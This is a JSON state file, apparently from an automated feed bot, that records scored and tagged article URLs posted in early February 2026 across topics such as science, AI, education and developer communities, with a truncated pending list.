{
  "meta": {
    "last_updated": "2026-02-09T23:34:39.413468Z",
    "retention_days": 7
  },
  "posted": {
    "science": [
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260201223737.htm",
        "posted_at": "2026-02-02",
        "score": 6.8,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-scientists-uncover-dual-role-sulfate.html",
        "posted_at": "2026-02-02",
        "score": 4.5,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-cosmic-brought-ionization-dark-cloud.html",
        "posted_at": "2026-02-03",
        "score": 7.9,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260128075323.htm",
        "posted_at": "2026-02-03",
        "score": 5.2,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-quick-curb-antimicrobial-resistance-bacteria.html",
        "posted_at": "2026-02-04",
        "score": 7.2,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260129080437.htm",
        "posted_at": "2026-02-04",
        "score": 4.9,
        "tags": [
          "transformation",
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-multi-sector-approach-global-posed.html",
        "posted_at": "2026-02-05",
        "score": 12.1,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260204121540.htm",
        "posted_at": "2026-02-05",
        "score": 5.2,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-neanderthals-gap-generative-ai-scholarly.html",
        "posted_at": "2026-02-06",
        "score": 10.7,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "ontology_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012229.htm",
        "posted_at": "2026-02-06",
        "score": 5.8,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012210.htm",
        "posted_at": "2026-02-07",
        "score": 7.5,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-qa-ai-discovery-therapeutic-drugs.html",
        "posted_at": "2026-02-07",
        "score": 4.8,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012213.htm",
        "posted_at": "2026-02-08",
        "score": 8.9,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.quantamagazine.org/expansion-microscopy-has-transformed-how-we-see-the-cellular-world-20260204/",
        "posted_at": "2026-02-08",
        "score": 4.7,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-scientists-advance-multi-purpose-photocatalyst.html",
        "posted_at": "2026-02-09",
        "score": 10.0,
        "tags": [
          "visibility_gain",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260207232242.htm",
        "posted_at": "2026-02-09",
        "score": 5.5,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      }
    ],
    "ai": [
      {
        "url": "https://venturebeat.com/technology/nous-researchs-nouscoder-14b-is-an-open-source-coding-model-landing-right-in",
        "posted_at": "2026-02-02",
        "score": 26.2,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2601.22707",
        "posted_at": "2026-02-02",
        "score": 21.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/02/02/1131822/the-crucial-first-step-for-designing-a-successful-enterprise-ai-system/",
        "posted_at": "2026-02-02",
        "score": 5.0,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/01/protecting-forests-is-not-just-about-biodiversityit-is-now-about-protecting-rain/?utm_source=rss&utm_medium=rss&utm_campaign=what-matters-for-global-crops-isnt-how-much-rainfall-but-where-it-comes-from",
        "posted_at": "2026-02-02",
        "score": 4.2,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://venturebeat.com/technology/the-creator-of-claude-code-just-revealed-his-workflow-and-developers-are",
        "posted_at": "2026-02-03",
        "score": 19.0,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2602.01401",
        "posted_at": "2026-02-03",
        "score": 17.8,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "ontology_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/01/26/1131726/why-chatbots-are-starting-to-check-your-age/",
        "posted_at": "2026-02-03",
        "score": 5.4,
        "tags": [
          "transformation",
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/02/biodegradable-plastics-are-not-a-climate-solution-on-their-own/?utm_source=rss&utm_medium=rss&utm_campaign=biodegradable-plastics-could-reduce-the-environmental-impact-of-the-plastics-industry-but-only-if-we-throw-them-away-properly",
        "posted_at": "2026-02-03",
        "score": 4.2,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://venturebeat.com/technology/salesforce-rolls-out-new-slackbot-ai-agent-as-it-battles-microsoft-and",
        "posted_at": "2026-02-04",
        "score": 18.2,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2502.16667",
        "posted_at": "2026-02-04",
        "score": 16.2,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/02/04/1131014/from-guardrails-to-governance-a-ceos-guide-for-securing-agentic-systems/",
        "posted_at": "2026-02-04",
        "score": 5.4,
        "tags": [
          "transformation",
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/01/can-cities-build-their-way-out-of-both-the-housing-and-the-climate-crises/?utm_source=rss&utm_medium=rss&utm_campaign=urban-construction-emissions-remain-sky-high",
        "posted_at": "2026-02-04",
        "score": 4.2,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://venturebeat.com/infrastructure/claude-code-costs-up-to-usd200-a-month-goose-does-the-same-thing-for-free",
        "posted_at": "2026-02-05",
        "score": 19.8,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2602.03883",
        "posted_at": "2026-02-05",
        "score": 17.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/01/27/1131793/openais-latest-product-lets-you-vibe-code-science/",
        "posted_at": "2026-02-05",
        "score": 4.8,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://techcrunch.com/2026/02/04/alphabet-wont-talk-about-the-google-apple-ai-deal-even-to-investors/",
        "posted_at": "2026-02-05",
        "score": 4.0,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://venturebeat.com/technology/anthropic-launches-cowork-a-claude-desktop-agent-that-works-in-your-files-no",
        "posted_at": "2026-02-06",
        "score": 32.6,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2602.04413",
        "posted_at": "2026-02-06",
        "score": 17.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "ontology_shift"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/02/could-we-cool-the-planet-by-turning-crop-waste-into-building-materials/?utm_source=rss&utm_medium=rss&utm_campaign=could-we-cool-the-planet-by-turning-crop-waste-into-building-materials",
        "posted_at": "2026-02-06",
        "score": 4.8,
        "tags": [
          "transformation",
          "scale_shift"
        ]
      },
      {
        "url": "https://techcrunch.com/2026/02/06/how-ai-is-helping-with-the-labor-issue-in-treating-rare-diseases/",
        "posted_at": "2026-02-06",
        "score": 4.6,
        "tags": [
          "boundary_crossing"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2602.03927",
        "posted_at": "2026-02-07",
        "score": 16.2,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://techcrunch.com/video/how-elon-musk-is-rewriting-the-rules-on-founder-power/",
        "posted_at": "2026-02-07",
        "score": 4.0,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/02/02/1132068/what-weve-been-getting-wrong-about-ais-truth-crisis/",
        "posted_at": "2026-02-07",
        "score": 4.6,
        "tags": [
          "transformation"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/01/should-the-climate-fight-shift-focus-from-curbing-emissions-to-reducing-human-suffering/?utm_source=rss&utm_medium=rss&utm_campaign=should-the-climate-fight-shift-focus-from-curbing-emissions-to-reducing-human-suffering",
        "posted_at": "2026-02-07",
        "score": 4.0,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://venturebeat.com/infrastructure/railway-secures-usd100-million-to-challenge-aws-with-ai-native-cloud",
        "posted_at": "2026-02-08",
        "score": 33.4,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2410.13431",
        "posted_at": "2026-02-08",
        "score": 13.0,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/02/06/1132448/moltbook-was-peak-ai-theater/",
        "posted_at": "2026-02-08",
        "score": 4.0,
        "tags": []
      },
      {
        "url": "https://techcrunch.com/podcast/how-far-will-elon-musk-take-the-everything-business-as-spacex-and-xai-merge/",
        "posted_at": "2026-02-08",
        "score": 4.0,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://venturebeat.com/technology/listen-labs-raises-usd69m-after-viral-billboard-hiring-stunt-to-scale-ai",
        "posted_at": "2026-02-09",
        "score": 31.8,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://arxiv.org/abs/2601.02075",
        "posted_at": "2026-02-09",
        "score": 16.2,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://www.technologyreview.com/2026/02/09/1132537/a-lesson-from-pokemon/",
        "posted_at": "2026-02-09",
        "score": 4.6,
        "tags": [
          "transformation"
        ]
      },
      {
        "url": "https://techcrunch.com/2026/02/09/anthropic-closes-in-on-20b-round/",
        "posted_at": "2026-02-09",
        "score": 3.6,
        "tags": [
          "boundary_crossing"
        ]
      }
    ],
    "education": [
      {
        "url": "https://edsource.org/2025/how-one-california-school-came-together-to-pack-20000-meals-for-the-holidays/746481",
        "posted_at": "2026-02-02",
        "score": 7.2,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.openculture.com/2026/02/david-lynch-remembers-attending-the-beatles-first-american-concert-in-1964.html",
        "posted_at": "2026-02-02",
        "score": 3.3,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://edsource.org/2025/fresno-unified-data-error-analysis/738872",
        "posted_at": "2026-02-03",
        "score": 6.5,
        "tags": [
          "transformation",
          "boundary_crossing"
        ]
      },
      {
        "url": "https://thewrongtools.wordpress.com/2019/10/10/the-everdeck/",
        "posted_at": "2026-02-03",
        "score": 3.6,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://edsource.org/2025/california-schools-to-use-reading-screening-test/733022",
        "posted_at": "2026-02-04",
        "score": 4.4,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://theconversation.com/in-the-australian-outback-were-listening-for-nuclear-tests-and-what-we-hear-matters-more-than-ever-272892",
        "posted_at": "2026-02-04",
        "score": 2.2,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://edsource.org/2026/technology-education-student-wellbeing/749262",
        "posted_at": "2026-02-05",
        "score": 5.1,
        "tags": [
          "boundary_crossing",
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.openculture.com/2026/02/cats-in-medieval-manuscripts-and-paintings.html",
        "posted_at": "2026-02-05",
        "score": 3.3,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://edsource.org/2024/as-we-expand-universal-preschool-access-lets-ensure-teachers-mirror-their-students-ethnicity/715393",
        "posted_at": "2026-02-06",
        "score": 4.4,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://www.humanityslastmachine.com/#planetary-roller-screws",
        "posted_at": "2026-02-06",
        "score": 3.6,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://edsource.org/2024/survey-californians-are-worried-about-student-health-lukewarm-toward-a-state-school-bond/709604",
        "posted_at": "2026-02-07",
        "score": 4.4,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://openciv3.org/",
        "posted_at": "2026-02-07",
        "score": 2.7,
        "tags": [
          "boundary_crossing"
        ]
      },
      {
        "url": "https://edsource.org/2026/california-universal-prekindergarten-implementation/748208",
        "posted_at": "2026-02-08",
        "score": 4.4,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://theconversation.com/new-technologies-are-stepping-up-the-global-fight-against-wildlife-trafficking-272137",
        "posted_at": "2026-02-08",
        "score": 2.2,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://theconversation.com/isaac-herzog-visit-protesters-lose-challenge-to-sweeping-special-police-powers-what-now-275436",
        "posted_at": "2026-02-09",
        "score": 4.5,
        "tags": [
          "boundary_crossing",
          "value_redefinition"
        ]
      },
      {
        "url": "https://edsource.org/2025/nixon-veto-childcare-lessons/747568",
        "posted_at": "2026-02-09",
        "score": 3.6,
        "tags": [
          "scale_shift"
        ]
      }
    ],
    "mycotech": [
      {
        "url": "https://www.sciencedaily.com/releases/2025/12/251226045324.htm",
        "posted_at": "2026-02-02",
        "score": 9.6,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-bacteria-numerous-cell.html",
        "posted_at": "2026-02-02",
        "score": 4.8,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260106001914.htm",
        "posted_at": "2026-02-03",
        "score": 8.2,
        "tags": [
          "transformation",
          "visibility_gain"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-species-competition-trait-diversity-worldwide.html",
        "posted_at": "2026-02-03",
        "score": 4.8,
        "tags": [
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-high-temperatures-disrupt-anthocyanin-metabolism.html",
        "posted_at": "2026-02-04",
        "score": 7.2,
        "tags": [
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260112001034.htm",
        "posted_at": "2026-02-04",
        "score": 5.2,
        "tags": [
          "transformation",
          "scale_shift"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-machines-molecular.html",
        "posted_at": "2026-02-05",
        "score": 11.4,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260107225541.htm",
        "posted_at": "2026-02-05",
        "score": 5.5,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/01/260101160854.htm",
        "posted_at": "2026-02-06",
        "score": 7.5,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.anthropocenemagazine.org/2026/02/could-we-cool-the-planet-by-turning-crop-waste-into-building-materials/?utm_source=rss&utm_medium=rss&utm_campaign=could-we-cool-the-planet-by-turning-crop-waste-into-building-materials",
        "posted_at": "2026-02-06",
        "score": 5.2,
        "tags": [
          "transformation",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012210.htm",
        "posted_at": "2026-02-07",
        "score": 7.5,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-qa-ai-discovery-therapeutic-drugs.html",
        "posted_at": "2026-02-07",
        "score": 4.8,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260206012213.htm",
        "posted_at": "2026-02-08",
        "score": 8.9,
        "tags": [
          "boundary_crossing",
          "visibility_gain"
        ]
      },
      {
        "url": "https://therevelator.org/sea-turtle-migration/",
        "posted_at": "2026-02-08",
        "score": 4.5,
        "tags": [
          "visibility_gain",
          "value_redefinition"
        ]
      },
      {
        "url": "https://phys.org/news/2026-02-wireless-sensor-subsoil-health-effort.html",
        "posted_at": "2026-02-09",
        "score": 9.3,
        "tags": [
          "transformation",
          "visibility_gain",
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.sciencedaily.com/releases/2026/02/260207232242.htm",
        "posted_at": "2026-02-09",
        "score": 5.5,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      }
    ],
    "curiosity": [
      {
        "url": "https://www.atlasobscura.com/articles/20-places-to-travel-and-transform-yourself-in-2026-from-atlas-obscura",
        "posted_at": "2026-02-02",
        "score": 12.8,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.smithsonianmag.com/smart-news/megalodons-went-extinct-millions-of-years-ago-the-prehistoric-predator-could-become-marylands-official-state-shark-180988108/",
        "posted_at": "2026-02-02",
        "score": 4.0,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/idaho-sun-valley-fascinating-places",
        "posted_at": "2026-02-03",
        "score": 12.1,
        "tags": [
          "transformation",
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://nautil.us/grad-student-homebrews-cosmic-dust-in-the-lab-1265478/",
        "posted_at": "2026-02-03",
        "score": 4.3,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/arizona-guide",
        "posted_at": "2026-02-04",
        "score": 12.1,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.quantamagazine.org/expansion-microscopy-has-transformed-how-we-see-the-cellular-world-20260204/",
        "posted_at": "2026-02-04",
        "score": 4.7,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/pedro-rodriguez-kissimmee",
        "posted_at": "2026-02-05",
        "score": 10.0,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://nautil.us/why-teflon-is-losing-its-sticking-power-1265937/",
        "posted_at": "2026-02-05",
        "score": 4.3,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/centralia-pennsylvania-rebirth",
        "posted_at": "2026-02-06",
        "score": 14.2,
        "tags": [
          "transformation",
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://nautil.us/did-we-just-see-a-black-hole-explode-1265919/",
        "posted_at": "2026-02-06",
        "score": 4.3,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/podcast-edison-ford-winter-estate",
        "posted_at": "2026-02-07",
        "score": 12.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://nautil.us/scientists-turn-to-the-internet-to-name-new-species-1266138/",
        "posted_at": "2026-02-07",
        "score": 4.0,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/podcast-caroline-mazel-carlton-1000-places",
        "posted_at": "2026-02-08",
        "score": 11.4,
        "tags": [
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.bbc.com/future/article/20260206-is-our-identity-affected-by-where-we-live?ocid=global_future_rss",
        "posted_at": "2026-02-08",
        "score": 4.0,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.atlasobscura.com/articles/podcast-fordlandia",
        "posted_at": "2026-02-09",
        "score": 10.0,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.bbc.com/future/article/20260203-landfills-and-coal-ash-the-untapped-sources-of-rare-earth-metals-needed-to-fuel-modern-technology?ocid=global_future_rss",
        "posted_at": "2026-02-09",
        "score": 5.2,
        "tags": [
          "transformation",
          "value_redefinition"
        ]
      }
    ],
    "bigtech": [
      {
        "url": "https://technode.com/2025/11/04/eric-jing-ant-group-to-strengthen-support-for-hong-kongs-global-finance-and-tech-leadership-with-ai-goglobal-services/",
        "posted_at": "2026-02-02",
        "score": 4.2,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://pandaily.com/from-goose-goose-duck-to-ai-social-kingame-bets-on-cross-sector-growth",
        "posted_at": "2026-02-02",
        "score": 3.9,
        "tags": [
          "boundary_crossing",
          "value_redefinition"
        ]
      },
      {
        "url": "https://techcrunch.com/2026/02/03/looking-ahead-to-2026-whats-next-for-startup-battlefield-200/",
        "posted_at": "2026-02-03",
        "score": 4.3,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://technode.com/2024/05/26/beyond-expo-2024-navigating-the-future-of-innovation-in-cross-border-e-commerce/",
        "posted_at": "2026-02-03",
        "score": 4.2,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.scmp.com/news/us/diplomacy/article/3342433/washington-pitches-critical-minerals-plan-allies-counter-beijings-dominance?utm_source=rss_feed",
        "posted_at": "2026-02-04",
        "score": 4.8,
        "tags": [
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.wired.com/story/inside-the-ice-forum-where-agents-complain-about-their-jobs/",
        "posted_at": "2026-02-04",
        "score": 4.0,
        "tags": [
          "scale_shift"
        ]
      },
      {
        "url": "https://technode.com/2025/09/12/satellite-imaging-inclusive-ai-and-privacy-preserving-tech-win-at-ant-groups-global-competition/",
        "posted_at": "2026-02-05",
        "score": 4.8,
        "tags": [
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.wired.com/story/i-infiltrated-moltbook-ai-only-social-network/",
        "posted_at": "2026-02-05",
        "score": 4.0,
        "tags": [
          "visibility_gain"
        ]
      },
      {
        "url": "https://techcrunch.com/2026/02/06/how-ai-is-helping-with-the-labor-issue-in-treating-rare-diseases/",
        "posted_at": "2026-02-06",
        "score": 4.9,
        "tags": [
          "boundary_crossing"
        ]
      },
      {
        "url": "https://technode.com/2025/06/05/behind-the-blind-box-boom-the-global-ascent-of-pop-marts-labubu/",
        "posted_at": "2026-02-06",
        "score": 4.5,
        "tags": [
          "transformation",
          "scale_shift"
        ]
      },
      {
        "url": "https://www.scmp.com/news/asia/south-asia/article/3342753/indias-modi-hails-great-news-after-us-slashes-tariffs-part-new-trade-deal?utm_source=rss_feed",
        "posted_at": "2026-02-07",
        "score": 4.2,
        "tags": [
          "boundary_crossing",
          "scale_shift"
        ]
      },
      {
        "url": "https://technode.com/2025/06/25/alibaba-merges-ele-me-fliggy-into-e-commerce-unit-in-strategic-shift/",
        "posted_at": "2026-02-07",
        "score": 3.9,
        "tags": [
          "boundary_crossing",
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.scmp.com/news/hong-kong/society/article/3342797/worker-scalded-hot-oil-biodiesel-facility-hong-kong?utm_source=rss_feed",
        "posted_at": "2026-02-08",
        "score": 5.1,
        "tags": [
          "transformation",
          "boundary_crossing"
        ]
      },
      {
        "url": "https://technode.com/2025/05/23/beyond-expo-2025-interview-with-zack-kass-ais-ultimate-challenge-will-be-crisis-of-purpose/",
        "posted_at": "2026-02-08",
        "score": 4.5,
        "tags": [
          "value_redefinition"
        ]
      },
      {
        "url": "https://www.scmp.com/opinion/asia-opinion/article/3342670/cambodia-frontline-battle-against-transnational-scam-syndicates?utm_source=rss_feed",
        "posted_at": "2026-02-09",
        "score": 4.8,
        "tags": [
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://technode.com/2026/01/28/from-biscuits-to-bytes-inside-the-lisbon-factory-breeding-global-unicorns/",
        "posted_at": "2026-02-09",
        "score": 3.6,
        "tags": [
          "scale_shift"
        ]
      }
    ],
    "devcommunity": [
      {
        "url": "https://dev.to/zaynelt/recovering-from-partial-failures-in-enterprise-mcp-tools-1m76",
        "posted_at": "2026-02-02",
        "score": 12.5,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://github.com/amantus-ai/vibetunnel",
        "posted_at": "2026-02-02",
        "score": 11.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://github.com/vita-epfl/Stable-Video-Infinity",
        "posted_at": "2026-02-03",
        "score": 9.7,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/martijn_assie_12a2d3b1833/using-puppeteer-to-test-wordpress-pages-for-visual-regressions-137",
        "posted_at": "2026-02-03",
        "score": 9.5,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/salvatore_zetina_afcf8b44/the-classifier-cage-why-ai-safety-layers-are-self-sabotage-5521",
        "posted_at": "2026-02-04",
        "score": 9.2,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/rivadaviam/the-build-to-learn-framework-how-a-near-disaster-taught-me-to-learn-in-public-c2e",
        "posted_at": "2026-02-04",
        "score": 8.9,
        "tags": [
          "visibility_gain",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://dev.to/devmatrash/when-sharedpreferences-fails-architecting-resilient-cache-infrastructure-for-production-flutter-3j3d",
        "posted_at": "2026-02-05",
        "score": 15.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/controlplane/why-the-next-aws-outage-will-cost-you-more-than-the-last-one-and-what-to-do-about-it-508j",
        "posted_at": "2026-02-05",
        "score": 15.2,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/devmatrash/from-03-crash-rate-to-zero-scaling-flutter-cache-with-batching-locking-and-observable-state-24oi",
        "posted_at": "2026-02-06",
        "score": 12.5,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://github.com/disler/claude-code-hooks-mastery",
        "posted_at": "2026-02-06",
        "score": 12.1,
        "tags": [
          "transformation",
          "boundary_crossing",
          "visibility_gain",
          "scale_shift"
        ]
      },
      {
        "url": "https://dev.to/douxxtech/how-i-built-a-random-number-generator-sort-of-37i",
        "posted_at": "2026-02-07",
        "score": 8.3,
        "tags": [
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/kristapaul/medical-billing-automation-system-lessons-learned-through-the-obgyn-workflows-5a9d",
        "posted_at": "2026-02-07",
        "score": 6.8,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://dev.to/gw-jeni-systems/why-windows-crashes-and-how-to-build-stable-pcs-4fib",
        "posted_at": "2026-02-08",
        "score": 10.1,
        "tags": [
          "transformation",
          "boundary_crossing",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://github.com/OpenBMB/MiniCPM-o",
        "posted_at": "2026-02-08",
        "score": 8.2,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift"
        ]
      },
      {
        "url": "https://dev.to/back2dos/using-ai-to-write-a-transpiler-pnf",
        "posted_at": "2026-02-09",
        "score": 14.0,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      },
      {
        "url": "https://dev.to/kike/speeding-up-saas-shipping-htmx-in-production-a-post-mortem-5bb9",
        "posted_at": "2026-02-09",
        "score": 11.6,
        "tags": [
          "transformation",
          "boundary_crossing",
          "value_redefinition",
          "scale_shift",
          "ontology_shift"
        ]
      }
    ]
  },
  "pending": {
    "science": [
      {
        "url": "https://phys.org/news/2026-02-molecule-sers-steadier-cb7.html",
        "title": "Single-molecule SERS gets steadier as CB[7] traps a 'dancing' molecule",
